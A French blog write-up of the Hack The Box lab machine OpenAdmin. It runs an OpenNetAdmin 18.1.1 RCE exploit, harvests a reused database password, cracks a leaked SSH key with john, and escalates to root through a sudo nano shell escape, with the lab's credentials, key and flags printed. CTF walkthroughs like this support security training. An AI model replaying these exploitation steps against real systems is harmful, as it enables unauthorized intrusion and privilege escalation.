---
layout: post
title: HTB - OpenAdmin
subtitle: Hack The Box - Linux Machine - Medium 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, OpenNetAdmin, dos2unix, ssh2john, LinEnum, Nano, scp, RCE]
comments: false
---
Nmap:

~~~
root@Host-001:~# nmap -sV 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-03 21:36 CET
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 50.00% done; ETC: 21:36 (0:00:01 remaining)
Nmap scan report for 10.10.10.171
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.88 seconds
~~~

Dirb:

~~~
root@Host-001:~# dirb http://10.10.10.171

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb  3 21:38:41 2020
URL_BASE: http://10.10.10.171/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.171/ ----
==> DIRECTORY: http://10.10.10.171/artwork/                                    
+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)                         
==> DIRECTORY: http://10.10.10.171/music/                                      
+ http://10.10.10.171/server-status (CODE:403|SIZE:277)                        
~~~
                                                           
Aller sur http://10.10.10.171/music/ 

Onglet Login, on tombe sur http://10.10.10.171/ona/ = OpenNetAdmin

L'écran indique qu'il s'agit de la version v18.1.1 et que ce n'est pas la derniere version

Exploit disponible: [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691)

Metasploit:

~~~
msf5 > searchsploit opennetadmin
[*] exec: searchsploit opennetadmin

--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Ex | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injectio | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Exec | exploits/php/webapps/47691.sh
--------------------------------------- ----------------------------------------
Shellcodes: No Result
msf5 >
~~~

Les 2 derniers exploit concernent la v.18.1.1

~~~
root@Host-001:/usr/share/exploitdb/exploits/php/webapps# ./47691.sh http://10.10.10.171/ona/

./47691.sh: line 8: $'\r': command not found

./47691.sh: line 16: $'\r': command not found

./47691.sh: line 18: $'\r': command not found

./47691.sh: line 23: syntax error near unexpected token `done'

./47691.sh: line 23: `done'
~~~

Le script est au format dos il faut le convertir en unix avec dos2unix

~~~
root@Host-001:/usr/share/exploitdb/exploits/php/webapps# dos2unix 47691.sh 

root@Host-001:/usr/share/exploitdb/exploits/php/webapps# ./47691.sh 10.10.10.171/ona/
$ whoami
www-data
$ ls
&1
47163
checkit.php
config
config_dnld.php
dcm.php
images
include
index.php
lala.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ pwd     
/opt/ona/www
~~~

On est donc dans le dossier /opt/ona/www. On va faire un tour sur le code source d'OpenNetAdmin sur github pour savoir ce qu'il y a dedans On trouve un dossier config et un fichier config.inc.php: [https://github.com/opennetadmin/ona/blob/master/www/config/config.inc.php](https://github.com/opennetadmin/ona/blob/master/www/config/config.inc.php)

~~~
$ cat /opt/ona/www/config/config.inc.php
<?php

///////////////////////   WARNING   /////////////////////////////
//           This is the site configuration file.              //
//                                                             //
//      It is not intended that this file be edited.  Any      //
//      user configurations should be in the local config or   //
//      in the database table sys_config                       //
//                                                             //
/////////////////////////////////////////////////////////////////

// Used in PHP for include files and such
// Prefix.. each .php file should have already set $base and $include
// if it is written correctly.  We assume that is the case.
$base;
$include;

$onabase = dirname($base);


//$baseURL = preg_replace('+' . dirname($_SERVER['DOCUMENT_ROOT']) . '+', '', $base);
//$baseURL = preg_replace('+/$+', '', $baseURL);

// Used in URL links
$baseURL=dirname($_SERVER['SCRIPT_NAME']); $baseURL = rtrim($baseURL, '/');
$images = "{$baseURL}/images";

// help URL location
$_ENV['help_url'] = "http://opennetadmin.com/docs/";


// Get any query info
parse_str($_SERVER['QUERY_STRING']);



// Many of these settings serve as defaults.  They can be overridden by the settings in
// the table "sys_config"
$conf = array (
    /* General Setup */
    // Database Context
    // For possible values see the $ona_contexts() array  in the database_settings.inc.php file
    "default_context"        => 'DEFAULT',

    /* Used in header.php */
    "title"                  => 'OpenNetAdmin :: ',
    "meta_description"       => '',
    "meta_keywords"          => '',
    "html_headers"           => '',

    /* Include Files: HTML */
    "html_style_sheet"       => "$include/html_style_sheet.inc.php",
    "html_desktop"           => "$include/html_desktop.inc.php",
    "loading_icon"           => "<br><center><img src=\"{$images}/loading.gif\"></center><br>",

    /* Include Files: Functions */
    "inc_functions"          => "$include/functions_general.inc.php",
    "inc_functions_gui"      => "$include/functions_gui.inc.php",
    "inc_functions_db"       => "$include/functions_db.inc.php",
    "inc_functions_auth"     => "$include/functions_auth.inc.php",
    "inc_db_sessions"        => "$include/adodb_sessions.inc.php",
    "inc_adodb"              => "$include/adodb/adodb.inc.php",
    "inc_adodb_xml"          => "$include/adodb/adodb-xmlschema03.inc.php",
    "inc_xajax_stuff"        => "$include/xajax_setup.inc.php",
    "inc_diff"               => "$include/DifferenceEngine.php",

    /* Settings for dcm.pl */
    "dcm_module_dir"         => "$base/modules",
    "plugin_dir"             => "$base/local/plugins",

    /* Defaults for some user definable options normally in sys_config table */
    "debug"                  => "2",
    "syslog"                 => "0",
    "stdout"                 => "0",
    "log_to_db"              => "0",
    "logfile"                => "/var/log/ona.log",

    /* The output charset to be used in htmlentities() and htmlspecialchars() filtering */
    "charset"                => "utf8",
    "php_charset"            => "UTF-8",

    // enable the setting of the database character set using the "set name 'charset'" SQL command
    // This should work for mysql and postgres but may not work for Oracle.
    // it will be set to the value in 'charset' above.
    "set_db_charset"         => TRUE,
);


// Read in the version file to our conf variable
// It must have a v<majornum>.<minornum>, no number padding, to match the check version code.
if (file_exists($base.'/../VERSION')) { $conf['version'] = trim(file_get_contents($base.'/../VERSION')); }

// The $self array is used to store globally available temporary data.
// Think of it as a cache or an easy way to pass data around ;)
// I've tried to define the entries that are commonly used:
$self = array (
    // Error messages will often get stored in here
    "error"                  => "",

    // All sorts of things get cached in here to speed things up
    "cache"                  => array(),

    // Get's automatically set to 1 if we're using HTTPS/SSL
    "secure"                 => 0,
);
// If the server port is 443 then this is a secure page
// This is basically used to put a padlock icon on secure pages.
if ($_SERVER['SERVER_PORT'] == 443) { $self['secure'] = 1; }




///////////////////////////////////////////////////////////////////////////////
//                            STYLE SHEET STUFF                              //
///////////////////////////////////////////////////////////////////////////////


// Colors
$color['bg']                   = '#FFFFFF';
$color['content_bg']           = '#FFFFFF';
$color['bar_bg']               = '#D3DBFF';
$color['border']               = '#555555'; //#1A1A1A
$color['form_bg']              = '#FFEFB6';

$color['font_default']         = '#000000';
$color['font_title']           = '#4E4E4E';
$color['font_subtitle']        = '#5A5A5A';
$color['font_error']           = '#E35D5D';

$color['link']                 = '#6B7DD1';
$color['vlink']                = '#6B7DD1';
$color['alink']                = '#6B7DD1';
$color['link_nav']             = '#0048FF';  // was '#7E8CD7';
$color['link_act']             = '#FF8000';  // was '#EB8F1F';
$color['link_domain']          = 'green';    // was '#5BA65B';

$color['button_normal']        = '#FFFFFF';
$color['button_hover']         = '#E0E0E0';

// Define some colors for the subnet map:
$color['bgcolor_map_host']     = '#BFD2FF';
$color['bgcolor_map_subnet']   = '#CCBFFF';
$color['bgcolor_map_selected'] = '#FBFFB6';
$color['bgcolor_map_empty']    = '#FFFFFF';

// Much of this configuration is required here since
// a lot of it's used in xajax calls before a web page is created.
$color['menu_bar_bg']          = '#F3F1FF';
$color['menu_header_bg']       = '#FFFFFF';
$color['menu_item_bg']         = '#F3F1FF';
$color['menu_header_text']     = '#436976';
$color['menu_item_text']       = '#436976';
$color['menu_item_selected_bg']= '#B1C6E3';
$color['menu_header_bg']       = '#B1C6E3';


// Style variables (used in PHP in various places)
$style['font-family'] = "Arial, Sans-Serif";
$style['borderT'] = "border-top: 1px solid {$color['border']};";
$style['borderB'] = "border-bottom: 1px solid {$color['border']};";
$style['borderL'] = "border-left: 1px solid {$color['border']};";
$style['borderR'] = "border-right: 1px solid {$color['border']};";

// Include the localized configuration settings
// MP: this may not be needed now that "user" configs are in the database
@include("{$base}/local/config/config.inc.php");

// Include the basic system functions
// any $conf settings used in this "require" should not be user adjusted in the sys_config table
require_once($conf['inc_functions']);

// Include the basic database functions
require_once($conf['inc_functions_db']);

// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
if (file_exists($dbconffile)) {
    if (substr(exec("php -l $dbconffile"), 0, 28) == "No syntax errors detected in") {
        @include($dbconffile);
    } else {
        echo "Syntax error in your DB config file: {$dbconffile}<br>Please check that it contains a valid PHP formatted array, or check that you have the php cli tools installed.<br>You can perform this check maually using the command 'php -l {$dbconffile}'.";
        exit;
    }
} else {
    require_once($base.'/../install/install.php');
    exit;
}

// Check to see if the run_install file exists.
// If it does, run the install process.
if (file_exists($base.'/local/config/run_install') or @$runinstaller or @$install_submit == 'Y') {
    // Process the install script
    require_once($base.'/../install/install.php');
    exit;
}

// Set multibyte encoding to UTF-8
if (@function_exists('mb_internal_encoding')) {
    mb_internal_encoding("UTF-8");
} else {
    printmsg("INFO => Missing 'mb_internal_encoding' function. Please install PHP 'mbstring' functions for proper UTF-8 encoding.", 0);
}

// If we dont have a ona_context set in the cookie, lets set a cookie with the default context
if (!isset($_COOKIE['ona_context_name'])) { $_COOKIE['ona_context_name'] = $conf['default_context']; setcookie("ona_context_name", $conf['default_context']); }

// (Re)Connect to the DB now.
global $onadb;
$onadb = db_pconnect('', $_COOKIE['ona_context_name']);

// Load the actual user config from the database table sys_config
// These will override any of the defaults set above
list($status, $rows, $records) = db_get_records($onadb, 'sys_config', 'name like "%"', 'name');
foreach ($records as $record) {
    printmsg("INFO => Loaded config item from database: {$record['name']}=''{$record['value']}''",5);
    $conf[$record['name']] = $record['value'];
}

// Include functions that replace the default session handler with one that uses MySQL as a backend
require_once($conf['inc_db_sessions']);

// Include the GUI functions
require_once($conf['inc_functions_gui']);

// Include the AUTH functions
require_once($conf['inc_functions_auth']);

// Start the session handler (this calls a function defined in functions_general)
startSession();

// Set session inactivity threshold
ini_set("session.gc_maxlifetime", $conf['cookie_life']);

// if search_results_per_page is in the session, set the $conf variable to it.  this fixes the /rows command
if (isset($_SESSION['search_results_per_page'])) $conf['search_results_per_page'] = $_SESSION['search_results_per_page'];

// Set up our page to https if requested for our URL links
if (@($conf['force_https'] == 1) or ($_SERVER['SERVER_PORT'] == 443)) {
    $https  = "https://{$_SERVER['SERVER_NAME']}";
}
else {
    if ($_SERVER['SERVER_PORT'] != 80) {
      $https  = "http://{$_SERVER['SERVER_NAME']}:{$_SERVER['SERVER_PORT']}";
    } else {
      $https  = "http://{$_SERVER['SERVER_NAME']}";
    }
}

// DON'T put whitespace at the beginning or end of included files!!!
?>
~~~

On remarque:

@include("{$base}/local/config/config.inc.php")

et 

$dbconffile = "{$base}/local/config/database_settings.inc.php";

~~~
$ cat /opt/ona/www/local/config/config.inc.php         == pas de résultat
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

$ 
~~~

On essaye de se connecter via SSH

~~~
root@Host-001:/usr/share/exploitdb/exploits/php/webapps# ssh ona_sys@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
ona_sys@10.10.10.171's password: 
Permission denied, please try again.
ona_sys@10.10.10.171's password: 
Permission denied, please try again.
ona_sys@10.10.10.171's password: 
ona_sys@10.10.10.171: Permission denied (publickey,password).
~~~

A priori on a pas le bon username (ona_sys). On relance l'exploit et on va chercher les users

~~~
root@Host-001:/usr/share/exploitdb/exploits/php/webapps# ./47691.sh 10.10.10.171/ona/
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
$ 
~~~

On essaye de se connecter via SSH avec le username jimmy mdp: n1nj4W4rri0R!

Bingo! mais on  trouve pas de user.txt dans le home de jimmy donc on fouille pour pouvoir se loguer avec joanna

~~~
jimmy@openadmin:/opt$ ls
ona  priv  priv.save
jimmy@openadmin:/opt$ cd ona/
-bash: cd: ona/: Permission denied
jimmy@openadmin:/opt$ cd ..
jimmy@openadmin:/$ ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
jimmy@openadmin:/$ cd var
jimmy@openadmin:/var$ ls
backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www
jimmy@openadmin:/var$ cd backups/
jimmy@openadmin:/var/backups$ ls
alternatives.tar.0        dpkg.diversions.0    group.bak    shadow.bak
apt.extended_states.0     dpkg.statoverride.0  gshadow.bak
apt.extended_states.1.gz  dpkg.status.0        passwd.bak
jimmy@openadmin:/var/backups$ cat shadow.bak 
cat: shadow.bak: Permission denied
jimmy@openadmin:/var/backups$ cd ..
jimmy@openadmin:/var$ cd www
jimmy@openadmin:/var/www$ ls
html  internal  ona
jimmy@openadmin:/var/www$ cd internal/
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
jimmy@openadmin:/var/www/internal$ cat index.php 
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

jimmy@openadmin:/var/www/internal$ curl http://10.10.10.171/main.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.171 Port 80</address>
</body></html>
~~~

Quels sont les ports en écoute sur le serveur?

~~~
jimmy@openadmin:/var/www/internal$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
~~~

On copie la clé RSA dans un fichier nommé id_rsa
On utilise John pr la cracker

~~~
root@Host-001:~/Bureau# vim id_rsa 
root@Host-001:~/Bureau# python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
root@Host-001:~/Bureau# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:03 DONE (2020-03-07 17:48) 0.3311g/s 4748Kp/s 4748Kc/s 4748KC/sa6_123..*7¡Vamos!
Session completed
~~~

Tente de se connecter via SSH avec 'bloodninjas' comme mot de passe, mais ce n'est pas le mot de passe SSh, il faut utiliser la clé RSA

~~~
root@Host-001:~/Bureau# ssh -i id_rsa joanna@10.10.10.171
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
joanna@10.10.10.171's password: 
Permission denied, please try again.
joanna@10.10.10.171's password: 
~~~

Mauvaise permission, la bonne permission est 600. Voir [https://stackoverflow.com/questions/9270734/ssh-permissions-are-too-open-error](https://stackoverflow.com/questions/9270734/ssh-permissions-are-too-open-error)

~~~
root@Host-001:~/Bureau# chmod 600 id_rsa
root@Host-001:~/Bureau# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt 
c9b2cf07d40807e62af62660f0c81b5f
joanna@openadmin:~$ 
~~~

#root

Dans une nouvelle fenetre:

~~~
root@Host-001:~/Bureau/LinEnum# scp -i /root/Bureau/id_rsa LinEnum.sh joanna@10.10.10.171:/home/joanna
Enter passphrase for key '/root/Bureau/id_rsa': 
LinEnum.sh                                    100%   46KB 170.6KB/s   00:00    
root@Host-001:~/Bureau/LinEnum# 
~~~

Dans la fenetre avec la conexion ssh ouverte:

~~~
joanna@openadmin:~$ ls
LinEnum.sh  user.txt
joanna@openadmin:~$ ls -la LinEnum.sh 
-rwxr-xr-x 1 joanna joanna 46631 Mar  7 17:26 LinEnum.sh
joanna@openadmin:~$ ./LinEnum.sh 
(...)
[+] We can sudo without supplying a password!
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv


[+] Possible sudo pwnage!
/bin/nano
(...)

joanna@openadmin:~$ sudo /bin/nano /opt/priv
~~~

Nano s'ouvre sans demander de mot de passe. On peut faire une elevation de privilege voir [https://gtfobins.github.io/gtfobins/nano/#file-read](https://gtfobins.github.io/gtfobins/nano/#file-read)

Premiere fenetre de nano, tapper ^R^X puis:

~~~
Command to execute: reset; sh 1>&0 2>&0# id                                     
uid=0(root) gid=0(root) groups=0(root)  ^X Read File
#  Cancel                               M-F New Buffer
# cd /root
# ls
root.txt
# cat root.txt
2f907ed450b361b2c2bf4e8795d5b561
# 
~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
